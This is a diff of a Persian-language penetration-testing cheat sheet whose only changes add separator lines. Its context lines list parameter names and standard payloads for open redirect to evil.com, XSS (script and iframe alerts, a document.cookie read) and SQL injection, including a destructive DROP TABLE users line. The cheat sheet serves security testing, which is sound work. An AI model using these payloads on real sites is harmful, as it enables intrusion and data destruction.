@@ -85,6 +85,10 @@ redirect=, url=, next=, callback=, return=, token=, id=, action=, page=
 - XSS ===>>>	q, search, name, message, comment, input, payload, text
 - SQL Injection ===>>>	id, user, username, password, search, page, filter, item
 
+
+=======================================================================
+
+
 ۲. payloadهای استاندارد برای Open Redirect
 شماره	Payload نمونه	توضیح کوتاه
 1	http://evil.com	آدرس URL ساده و مستقیم
@@ -96,6 +100,9 @@ redirect=, url=, next=, callback=, return=, token=, id=, action=, page=
 7	https:/\evil.com	ترکیب اسلش و بک اسلش
 8	//evil.com%00	استفاده از null byte برای قطع رشته
 9	%EF%BC%8E%EF%BC%8E%2Fevil.com	استفاده از نقطه fullwidth و اسلش
+
+=======================================================================
+
 ۳. payloadهای استاندارد برای XSS
 شماره	Payload نمونه	توضیح کوتاه
 1	<script>alert('XSS')</script>	سادهترین کد اجرای اسکریپت
@@ -105,6 +112,10 @@ redirect=, url=, next=, callback=, return=, token=, id=, action=, page=
 5	<body onload=alert(1)>	اجرای اسکریپت هنگام بارگذاری صفحه
 6	"><iframe src="javascript:alert(1)"></iframe>	تست iframe با کد جاوااسکریپت
 7	javascript:alert(document.cookie)	تست اجرای دستور جاوااسکریپت داخل URL
+
+=======================================================================
+
+
 ۴. payloadهای استاندارد برای SQL Injection
 شماره	Payload نمونه	توضیح کوتاه
 1	' OR '1'='1	شرط همواره درست برای نفوذ
@@ -114,6 +125,9 @@ redirect=, url=, next=, callback=, return=, token=, id=, action=, page=
 5	'; DROP TABLE users;--	حمله مخرب حذف جدول
 6	" OR ""="	شرط همواره درست با کوتیشن دوتایی
 7	' OR SLEEP(5)--	تست تأخیر (Blind SQL Injection)
+
+=======================================================================
+
 نکات مهم استفاده
 همیشه تستها را روی پارامترهای ورودی که توسط برنامه پذیرش میشوند (مثل query string، فرمها، هدرها) انجام دهید.
 
